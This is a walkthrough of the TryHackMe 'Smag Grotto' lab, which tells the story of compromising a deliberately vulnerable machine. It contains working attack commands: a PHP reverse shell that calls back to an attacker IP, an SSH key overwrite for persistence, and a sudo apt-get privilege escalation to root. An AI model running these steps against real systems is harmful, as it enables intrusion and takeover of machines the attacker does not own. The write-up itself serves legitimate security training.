# Smag Grotto — Walkthrough #

**Date:** 09 January 2026  
**Platform:** TryHackMe  
**Difficulty:** Easy–Medium  
**Focus:** Enumeration, PCAP analysis, web exploitation, SSH key abuse, sudo privilege escalation

---



## 🔍 Initial Enumeration

I started with the usual web enumeration checklist:

- Directory brute-forcing
- Virtual host fuzzing
- Manual browsing
- Source code review
- `robots.txt`




### Dirsearch

Running `dirsearch` quickly paid off:


bash
dirsearch -u http://smag.thm


📁 Interesting find:

/mail

This directory turned out to be key later on.

VHost Fuzzing

I also tried vhost fuzzing to see if anything interesting was hiding behind a virtual host:

ffuf -u http://smag.thm -H "Host: FUZZ.smag.thm" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt


❌ No valid virtual hosts were discovered.




📂 PCAP Analysis

While browsing the site, I discovered a PCAP file.
Downloaded it directly:

wget http://smag.thm/path/to/file.pcap

Wireshark Findings

Opening the file in Wireshark revealed credentials in cleartext:

username: helpdesk
password: cH4nG3M3_n0w






🚨 Always inspect PCAPs — people leave secrets everywhere.

🤖 robots.txt Surprise

Checking robots.txt revealed something interesting:

<!-- <a>Bcc: trodd@smag.thm</a> -->




Not directly exploitable on its own, but another confirmation that email was part of the intended path.




🔐 Web Login & Reverse Shell

Using the credentials found in the PCAP, I logged into the web interface successfully.

Listener

On my machine:

nc -nvlp 1234

Reverse Shell Payload

Executed on the target:

/usr/bin/php -r '$sock=fsockopen("192.168.138.111",1234);exec("sh <&3 >&3 2>&3");'


Boom — shell access.




🐚 Shell Stabilisation

To make the shell usable:

python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm


Now we’ve got a proper interactive shell.





🔑 SSH Key Abuse (Persistence / Lateral Move)

Instead of brute forcing or guessing passwords, I went the cleaner route: SSH key replacement.

Generate SSH Keys (Attacker Machine)
ssh-keygen -t rsa


This generates:

A private key

A public key

Example using a custom name:

ssh-keygen -f jake


Result:

jake      (private key)
jake.pub  (public key)

Overwrite Victim’s Public Key

Using the shell access, I replaced Jake’s public key backup:

echo "YOUR_PUBLIC_KEY_HERE" > /opt/.backups/jake_id_rsa.pub.backup






⏳ After waiting a couple of minutes (cron job doing its thing), SSH access became available.

🏁 User Flag

Once logged in as jake:

cat user.txt


✅ User flag obtained.

🔥 Privilege Escalation

Time for the classic:

sudo -l


This revealed a command that could be run as root.

Checking GTFOBins, I found a matching privilege escalation technique.
(

When the shell exits the update command is actually executed.

sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh

)
After exploiting it:

cat root.txt


🎉 Root flag captured.
